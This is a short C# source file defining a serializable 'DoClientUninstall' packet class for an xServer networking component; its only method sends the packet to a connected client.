using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoClientUninstall : IPacket
    {
        public DoClientUninstall()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}